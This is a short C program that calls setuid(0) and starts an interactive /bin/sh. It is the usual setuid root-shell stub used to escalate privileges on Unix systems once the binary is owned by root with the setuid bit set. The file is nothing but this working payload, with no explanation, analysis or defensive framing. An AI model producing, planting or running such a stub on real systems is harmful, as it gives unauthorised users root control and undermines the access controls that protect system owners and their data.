#include <stdio.h>
#include <unistd.h>
int main(){
setuid(0);
execl("/bin/sh","sh","-i",NULL);
}
